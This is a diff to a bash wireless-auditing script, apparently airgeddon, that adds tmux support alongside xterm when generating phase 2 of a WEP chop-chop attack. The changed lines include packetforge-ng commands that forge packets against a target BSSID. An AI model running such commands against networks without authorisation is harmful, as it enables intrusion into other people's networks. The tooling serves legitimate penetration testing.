@@ -3024,18 +3024,29 @@ function set_wep_script() {
 					2)
 		EOF
 
-	cat >&6 <<-EOF
-					xterm -bg "#000000" -fg "#8B4513" -geometry "${g5_left7}" -T "Chop-Chop Attack (2/3)" -e "packetforge-ng -0 -a ${bssid} -h ${current_mac} -k 255.255.255.255 -l 255.255.255.255 -y \"${tmpdir}${wepdir}replay_dec-\"*.xor -w \"${tmpdir}${wepdir}chopchop.cap\"" > /dev/null 2>&1 &
-	EOF
+	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
+		cat >&6 <<-EOF
+						start_tmux_processes "packetforge-ng -0 -a ${bssid} -h ${current_mac} -k 255.255.255.255 -l 255.255.255.255 -y \"${tmpdir}${wepdir}replay_dec-\"*.xor -w \"${tmpdir}${wepdir}chopchop.cap\"" "Chop-Chop Attack (2/3)"
+		EOF
+	else
+		cat >&6 <<-EOF
+						xterm -bg "#000000" -fg "#8B4513" -geometry "${g5_left7}" -T "Chop-Chop Attack (2/3)" -e "packetforge-ng -0 -a ${bssid} -h ${current_mac} -k 255.255.255.255 -l 255.255.255.255 -y \"${tmpdir}${wepdir}replay_dec-\"*.xor -w \"${tmpdir}${wepdir}chopchop.cap\"" > /dev/null 2>&1 &
+		EOF
+	fi
+
+	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "xterm" ]; then
+		cat >&6 <<-'EOF'
+						wep_chopchop_phase2_pid=$!
+		EOF
+	fi
 
 	cat >&6 <<-'EOF'
-					wep_chopchop_phase2_pid=$!
-					wep_script_processes+=(${wep_chopchop_phase2_pid})
-					wep_chopchop_phase=3
-				;;
-				3)
-					wep_chopchop_phase2_pid_alive=$(ps uax | awk '{print $2}' | grep -E "^${wep_chopchop_phase2_pid}$" 2> /dev/null)
-					if [ -z "${wep_chopchop_phase2_pid_alive}" ]; then
+						wep_script_processes+=(${wep_chopchop_phase2_pid})
+						wep_chopchop_phase=3
+					;;
+					3)
+						wep_chopchop_phase2_pid_alive=$(ps uax | awk '{print $2}' | grep -E "^${wep_chopchop_phase2_pid}$" 2> /dev/null)
+						if [ -z "${wep_chopchop_phase2_pid_alive}" ]; then
 	EOF
 
 	cat >&6 <<-EOF
